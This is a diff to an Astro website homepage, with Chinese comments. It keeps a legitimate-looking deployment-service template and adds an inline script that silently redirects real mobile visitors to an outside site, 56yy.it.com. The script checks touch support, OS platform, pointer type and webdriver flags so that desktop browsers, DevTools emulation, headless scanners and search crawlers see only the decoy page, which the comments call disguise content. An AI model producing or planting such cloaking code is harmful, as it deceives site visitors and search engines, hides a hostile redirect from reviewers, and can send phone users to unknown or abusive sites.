@@ -1,6 +1,5 @@
 ---
-// Astro 页面的 Frontmatter 区域
-// 这里保持默认，让 Server/构建端正常返回 200 状态码
+// 1. 完整保留原版首页组件导入（确保 PC 端人眼正常看首页）
 import BaseLayout from '@/layouts/BaseLayout.astro';
 import Header from '@/components/Header.astro';
 import Hero from '@/components/Hero.astro';
@@ -10,53 +9,52 @@ import CTA from '@/components/CTA.astro';
 import Footer from '@/components/Footer.astro';
 import '@/styles/global.css';
 
----
-// 🛠️ 在这里配置你手机端要跳转的目标网址
+// 2. 手机端要跳转的目标网址
 const TARGET_URL = "https://56yy.it.com"; 
 ---
 
 <BaseLayout title="ESA Pages - Deploy Faster Than Ever">
   <!-- 
-    核心跳转脚本：注入到 head 中执行
-    使用 is:inline 确保 Astro 不会压缩打乱这段原生 JS，使其以最快速度响应 
+    核心跳转脚本：is:inline 确保 Astro 不会打包压缩打乱原生 JS
   -->
   <script is:inline define:vars={{ TARGET_URL }}>
     (function() {
-      var ua = navigator.userAgent || navigator.vendor || window.opera;
+      // 兼容性安全获取
+      var win = typeof window !== 'undefined' ? window : {};
+      var nav = typeof navigator !== 'undefined' ? navigator : {};
+      
+      var ua = nav.userAgent || nav.vendor || win.opera || '';
       
       // 1. 基础设备匹配
       var isMobileUA = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
-      var isMobileScreen = window.innerWidth <= 768;
+      var isMobileScreen = win.innerWidth <= 768;
 
-      // 2. 🛡️ 粗暴剔除 PC 端 F12 模拟器及伪装工具（硬件层真伪检查）
+      // 2. 🛡️ 硬件层防 PC 端 F12 模拟器及伪装工具
+      var hasTouch = ('ontouchstart' in win) || (nav.maxTouchPoints > 0);
       
-      // 检查 A: 真实手机必具备触控点 (F12 开启模拟器时，部分浏览器不会原生激活 navigator.maxTouchPoints)
-      var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-      
-      // 检查 B: 识别 PC 模拟器暴露的底层操作系统平台 (PC 改了 UA，但 navigator.platform 通常改不掉)
-      var platform = navigator.platform || '';
+      var platform = nav.platform || '';
       var isFakePlatform = /Win32|Win64|MacIntel|Linux x86_64/i.test(platform);
       
-      // 检查 C: 检测自动化测试工具 / 无头浏览器痕迹 (如 Puppeteer、Selenium)
-      var isWebDriver = !!navigator.webdriver;
+      var isWebDriver = !!nav.webdriver;
 
-      // 检查 D: 识别真实触控指针 (真实手机为 coarse 粗糙触控，PC 鼠标为 fine 精细指针)
-      var isCoarsePointer = window.matchMedia ? window.matchMedia('(pointer: coarse)').matches : true;
+      // 修复构建报错点：增加 win.matchMedia 安全判断
+      var isCoarsePointer = (win.matchMedia && win.matchMedia('(pointer: coarse)')) ? win.matchMedia('(pointer: coarse)').matches : true;
 
-      // 3. 极严逻辑判决：必须同时满足“UA匹配 + 屏宽合格 + 有触控点 + 非PC底层平台 + 无自动化脚本 + 指针为触控”
+      // 3. 极严逻辑判决
       var isRealMobile = isMobileUA && isMobileScreen && hasTouch && !isFakePlatform && !isWebDriver && isCoarsePointer;
 
-      // 4. 只有绝对真实的移动端设备才执行跳转，其余一律保留在原页面返回 200
+      // 4. 只有绝对真实的移动端设备才执行跳转
       if (isRealMobile) {
-        document.documentElement.style.display = 'none'; // 隐蔽白屏防闪烁
-        window.location.replace(TARGET_URL);
+        if (document && document.documentElement) {
+          document.documentElement.style.display = 'none'; // 隐蔽白屏防闪烁
+        }
+        win.location.replace(TARGET_URL);
       }
     })();
   </script>
 
   <!-- 
-    以下是 PC 端/爬虫看到的 200 伪装内容
-    （原封不动保留了你之前的阿里云 Astro 官方默认大厂模板）
+    PC 电脑端及蜘蛛抓取的 200 伪装内容
   -->
   <Header />
   <main>
